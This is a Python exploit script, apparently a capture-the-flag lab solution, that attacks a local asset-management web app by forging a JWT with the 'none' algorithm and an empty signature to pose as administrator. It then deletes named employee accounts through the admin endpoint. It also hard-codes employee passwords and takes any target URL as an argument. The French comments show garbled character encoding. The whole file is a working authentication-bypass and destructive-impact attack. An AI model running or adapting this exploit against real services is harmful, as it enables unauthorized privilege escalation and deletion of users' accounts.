#!/usr/bin/env python3
"""
JWT Authentication Bypass Exploit
Corporate Asset Management System

Auteur: CyberCTF Security Lab
Vuln√©rabilit√©: JWT 'none' algorithm bypass
"""

import requests
import base64
import json
import sys
import time
from urllib.parse import quote

class JWTBypassExploit:
    def __init__(self, base_url="http://localhost:3206"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def banner(self):
        """Affiche la banni√®re de l'exploit"""
        print("=" * 70)
        print("üî• JWT AUTHENTICATION BYPASS EXPLOIT")
        print("üéØ Target: Corporate Asset Management System")
        print("üöÄ Vulnerability: JWT 'none' algorithm bypass")
        print("=" * 70)
        print()
    
    def step1_login_employee(self):
        """√âtape 1: Login avec un compte employ√© pour analyser le JWT"""
        print("üìã √âtape 1: Login avec compte employ√© normal")
        print("-" * 50)
        
        # Comptes employ√©s disponibles (selon app.py)
        accounts = [
            ('mitchell.parker', 'corporate2024'),
            ('sarah.johnson', 'finance789')
        ]
        
        for username, password in accounts:
            print(f"üîë Tentative de connexion: {username}")
            
            login_data = {
                'username': username,
                'password': password
            }
            
            try:
                response = self.session.post(f"{self.base_url}/login", data=login_data, allow_redirects=False)
                
                if response.status_code in [302, 200]:
                    # R√©cup√©rer le token JWT depuis les cookies
                    auth_token = None
                    for cookie in self.session.cookies:
                        if cookie.name in ['auth_token', 'token']:
                            auth_token = cookie.value
                            break
                    
                    if auth_token:
                        print(f"‚úÖ Connexion r√©ussie ! Token re√ßu:")
                        print(f"   {auth_token[:50]}...")
                        
                        # Analyser le token
                        self.analyze_jwt(auth_token)
                        return auth_token
                    else:
                        print("‚ùå Connexion √©chou√©e - pas de token re√ßu")
                else:
                    print(f"‚ùå √âchec connexion - Code: {response.status_code}")
            except Exception as e:
                print(f"‚ùå Erreur connexion: {e}")
        
        print("‚ùå Impossible de se connecter avec les comptes employ√©s")
        return None
    
    def analyze_jwt(self, token):
        """Analyser la structure du JWT re√ßu"""
        print(f"\nüîç Analyse du JWT:")
        print("-" * 30)
        
        try:
            # S√©parer les parties du JWT
            parts = token.split('.')
            print(f"Parties JWT: {len(parts)}")
            
            # D√©coder le header
            header_b64 = parts[0]
            # Ajouter du padding si n√©cessaire
            header_padded = header_b64 + '=' * (4 - len(header_b64) % 4)
            header_data = json.loads(base64.urlsafe_b64decode(header_padded))
            print(f"Header: {json.dumps(header_data, indent=2)}")
            
            # D√©coder le payload
            payload_b64 = parts[1]
            payload_padded = payload_b64 + '=' * (4 - len(payload_b64) % 4)
            payload_data = json.loads(base64.urlsafe_b64decode(payload_padded))
            print(f"Payload: {json.dumps(payload_data, indent=2)}")
            
            # Signature
            signature = parts[2] if len(parts) > 2 else ""
            print(f"Signature: {signature[:20]}..." if signature else "Signature: (vide)")
            
            return header_data, payload_data, signature
            
        except Exception as e:
            print(f"‚ùå Erreur analyse JWT: {e}")
            return None, None, None
    
    def step2_forge_malicious_jwt(self):
        """√âtape 2: Forger un JWT malicieux avec algorithm 'none'"""
        print(f"\nüìã √âtape 2: Forge du JWT malicieux")
        print("-" * 50)
        
        # Header avec algorithm 'none' (REQUIS pour le bypass)
        malicious_header = {
            "alg": "none",
            "typ": "JWT"
        }
        
        # Payload avec les credentials administrateur (REQUIS pour le bypass)
        malicious_payload = {
            "sub": "administrator",  # MUST be exactly "administrator"
            "role": "admin",         # MUST be exactly "admin" 
            "department": "Management",
            "exp": int(time.time()) + 86400  # 24h expiration
        }
        
        print("üî® Construction du JWT malicieux:")
        print(f"   Header: {json.dumps(malicious_header)}")
        print(f"   Payload: {json.dumps(malicious_payload)}")
        
        # Encoder en Base64 URL-safe
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(malicious_header, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(malicious_payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        # JWT avec signature VIDE (REQUIS pour le bypass)
        malicious_jwt = f"{header_b64}.{payload_b64}."
        
        print(f"\n‚úÖ JWT malicieux g√©n√©r√©:")
        print(f"{malicious_jwt}")
        
        return malicious_jwt
    
    def step3_admin_access(self, malicious_jwt):
        """√âtape 3: Utiliser le JWT malicieux pour acc√©der au panel admin"""
        print(f"\nüìã √âtape 3: Test d'acc√®s administrateur")
        print("-" * 50)
        
        # URL encoder le token pour √©viter les probl√®mes
        encoded_jwt = quote(malicious_jwt, safe='')
        
        # Cr√©er une nouvelle session avec le token malicieux
        exploit_session = requests.Session()
        exploit_session.cookies.set('auth_token', malicious_jwt)
        
        print(f"üîì Tentative d'acc√®s au panel admin...")
        
        try:
            # Acc√©der au panel admin
            response = exploit_session.get(f"{self.base_url}/admin", allow_redirects=False)
            
            if response.status_code == 200:
                print("‚úÖ SUCC√àS ! Acc√®s administrateur obtenu !")
                
                # V√©rifier le contenu
                if "Administrator Panel" in response.text:
                    print("üéØ Panel administrateur accessible")
                    
                    # Extraire les informations sur les utilisateurs
                    self.extract_user_info(response.text)
                    
                    return True
                else:
                    print("‚ö†Ô∏è  Acc√®s obtenu mais contenu inattendu")
                    
            elif response.status_code == 302:
                print("‚ùå Redirection d√©tect√©e - bypass √©chou√©")
            elif response.status_code == 403:
                print("‚ùå Acc√®s refus√© - bypass √©chou√©")
            else:
                print(f"‚ùå R√©ponse inattendue: {response.status_code}")
                
        except Exception as e:
            print(f"‚ùå Erreur lors de l'acc√®s admin: {e}")
        
        return False
    
    def extract_user_info(self, html_content):
        """Extraire les informations des utilisateurs depuis la page admin"""
        print(f"\nüìä Informations syst√®me extraites:")
        print("-" * 40)
        
        # Parser simple pour extraire les infos (sans BeautifulSoup)
        if "users" in html_content.lower():
            print("üë• Utilisateurs cibles d√©tect√©s dans le syst√®me")
            
        # Chercher les patterns de statistiques
        import re
        
        # Extraire le nombre d'utilisateurs
        user_match = re.search(r'"Total Users".*?(\d+)', html_content, re.DOTALL)
        if user_match:
            user_count = user_match.group(1)
            print(f"   üìà Nombre d'utilisateurs: {user_count}")
            
        # Extraire le nombre d'actifs
        asset_match = re.search(r'"Total Assets".*?(\d+)', html_content, re.DOTALL)
        if asset_match:
            asset_count = asset_match.group(1)
            print(f"   üíª Nombre d'actifs: {asset_count}")
            
        print("üéØ Objectif: Supprimer tous les utilisateurs employ√©s")
    
    def step4_delete_users(self, malicious_jwt):
        """√âtape 4: Supprimer tous les utilisateurs employ√©s"""
        print(f"\nüìã √âtape 4: Suppression des utilisateurs cibles")
        print("-" * 50)
        
        # Session avec token administrateur
        admin_session = requests.Session()
        admin_session.cookies.set('auth_token', malicious_jwt)
        
        # Utilisateurs cibles √† supprimer
        target_users = ['mitchell.parker', 'sarah.johnson']
        
        successful_deletions = 0
        
        for username in target_users:
            print(f"üóëÔ∏è  Suppression de l'utilisateur: {username}")
            
            try:
                # Envoyer la requ√™te de suppression
                response = admin_session.get(
                    f"{self.base_url}/admin/delete?username={username}",
                    allow_redirects=False
                )
                
                if response.status_code == 200:
                    try:
                        result = response.json()
                        if result.get('success'):
                            print(f"   ‚úÖ {username} supprim√© avec succ√®s")
                            successful_deletions += 1
                        else:
                            print(f"   ‚ùå √âchec: {result.get('error', 'Erreur inconnue')}")
                    except:
                        # Si ce n'est pas du JSON, v√©rifier le contenu
                        if "success" in response.text.lower():
                            print(f"   ‚úÖ {username} supprim√© avec succ√®s")
                            successful_deletions += 1
                        else:
                            print(f"   ‚ùå R√©ponse inattendue")
                else:
                    print(f"   ‚ùå Erreur HTTP: {response.status_code}")
                    
            except Exception as e:
                print(f"   ‚ùå Erreur lors de la suppression: {e}")
        
        print(f"\nüìä R√©sum√© des suppressions:")
        print(f"   üéØ Utilisateurs cibl√©s: {len(target_users)}")
        print(f"   ‚úÖ Suppressions r√©ussies: {successful_deletions}")
        
        if successful_deletions == len(target_users):
            print("\nüèÜ CHALLENGE R√âUSSI !")
            print("üéâ Tous les utilisateurs cibles ont √©t√© supprim√©s")
            self.check_final_state()
        else:
            print(f"\n‚ö†Ô∏è  Challenge partiellement r√©ussi ({successful_deletions}/{len(target_users)})")
    
    def check_final_state(self):
        """V√©rifier l'√©tat final du syst√®me"""
        print(f"\nüìã V√©rification de l'√©tat final")
        print("-" * 50)
        
        try:
            # V√©rifier la page publique des utilisateurs
            response = self.session.get(f"{self.base_url}/users")
            
            if response.status_code == 200:
                if "No users have been registered" in response.text or "0 users" in response.text:
                    print("‚úÖ Confirmation: Aucun utilisateur employ√© restant")
                    print("üéØ L'objectif du challenge a √©t√© atteint")
                else:
                    print("‚ÑπÔ∏è  Il reste peut-√™tre des utilisateurs dans le syst√®me")
            
        except Exception as e:
            print(f"‚ö†Ô∏è  Impossible de v√©rifier l'√©tat final: {e}")
    
    def run_exploit(self):
        """Ex√©cuter l'exploit complet"""
        self.banner()
        
        print("üöÄ D√©marrage de l'exploitation JWT...")
        print()
        
        # √âtape 1: Login employ√© (pour comprendre)
        print("Phase 1: Reconnaissance")
        employee_token = self.step1_login_employee()
        
        if not employee_token:
            print("‚ùå Impossible de continuer sans token de r√©f√©rence")
            return
        
        # √âtape 2: Forge du JWT malicieux
        print("\nPhase 2: Exploitation")
        malicious_jwt = self.step2_forge_malicious_jwt()
        
        # √âtape 3: Test d'acc√®s admin
        admin_access = self.step3_admin_access(malicious_jwt)
        
        if not admin_access:
            print("‚ùå L'exploitation a √©chou√© - v√©rifiez la configuration")
            return
        
        # √âtape 4: Suppression des utilisateurs
        print("\nPhase 3: Impact")
        self.step4_delete_users(malicious_jwt)
        
        print(f"\n" + "=" * 70)
        print("üèÅ EXPLOITATION TERMIN√âE")
        print("üìù Rapport d'impact:")
        print("   ‚Ä¢ Bypass d'authentification JWT r√©ussi")
        print("   ‚Ä¢ √âl√©vation de privil√®ges vers administrateur")
        print("   ‚Ä¢ Suppression d'utilisateurs du syst√®me")
        print("   ‚Ä¢ Vuln√©rabilit√©: Acceptation algorithm 'none'")
        print("=" * 70)

def main():
    """Point d'entr√©e principal"""
    print("JWT Authentication Bypass Exploit Tool")
    print("Usage: python exploit_jwt_bypass.py [URL]")
    
    # URL par d√©faut
    base_url = "http://localhost:3206"
    
    # Permettre de sp√©cifier une URL diff√©rente
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    
    print(f"Target: {base_url}")
    print()
    
    # Cr√©er et ex√©cuter l'exploit
    exploit = JWTBypassExploit(base_url)
    exploit.run_exploit()

if __name__ == "__main__":
    main()